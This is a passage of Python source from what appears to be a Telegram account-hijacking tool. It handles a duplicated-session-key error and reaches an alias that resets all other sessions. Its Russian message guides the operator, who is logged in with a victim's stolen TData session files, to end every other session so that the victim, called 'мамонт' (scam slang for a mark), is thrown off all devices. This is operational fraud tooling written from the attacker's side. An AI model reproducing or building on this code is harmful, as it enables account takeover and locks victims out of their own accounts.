            from shared.service_listener import is_auth_key_duplicated, _desktop_active_until
            if is_auth_key_duplicated(e):
                if user_tg_id:
                    _desktop_active_until[user_tg_id] = time.time() + 600
                return {
                    "ok": False,
                    "error_code": "AUTH_KEY_DUPLICATED",
                    "message": (
                        "ℹ️ <b>В аккаунт выполнен вход через Telegram Desktop (TData) с вашего ПК!</b>\n\n"
                        "По правилам безопасности Telegram один ключ сессии не может отправлять запросы с двух разных IP одновременно (с сервера и с вашего компьютера).\n\n"
                        "💡 <b>Как завершить сессии мамонта:</b>\n"
                        "1. Откройте ваш <b>Telegram Desktop</b> (куда вы зашли по TData).\n"
                        "2. Перейдите: <b>Настройки ➔ Устройства ➔ «Завершить все другие сеансы»</b>.\n\n"
                        "<i>(Мамонт будет моментально выброшен со всех устройств, а ваш Telegram Desktop останется единственным активным!)</i>"
                    ),
                }
            return {"ok": False, "message": f"Ошибка сброса сессий: {e}"}
    except Exception as exc:
        return {"ok": False, "message": f"Ошибка выполнения: {exc}"}
    finally:
        if should_disconnect and client:
            try:
                await client.disconnect()
            except Exception:
                pass


terminate_other_sessions = reset_all_other_authorizations




